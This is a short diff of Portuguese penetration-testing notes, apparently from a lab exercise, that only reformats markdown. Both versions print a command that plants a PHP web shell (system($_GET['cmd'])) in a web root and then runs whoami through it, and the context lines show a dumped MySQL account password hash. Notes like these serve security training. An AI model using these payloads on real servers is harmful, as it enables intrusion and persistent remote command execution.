@@ -394,9 +394,9 @@ mysql  Ver 14.14 Distrib 5.5.50, for debian-linux-gnu (x86_64) using readline 6.
   debian-sys-maint	localhost	*300DD417C72920F12EBD3A01236771655230AC5A
 ```
 
-Criar shell via web shell:
-bash
-http://rh.businesscorp.com.br/web_shell.php?cmd=echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/admin.php
-Acessar:
-bash
-http://rh.businesscorp.com.br/admin.php?cmd=whoami
+## Criar shell via web shell:
+- bash
+  - http://rh.businesscorp.com.br/web_shell.php?cmd=echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/admin.php
+- Acessar:
+- bash
+  - http://rh.businesscorp.com.br/admin.php?cmd=whoami
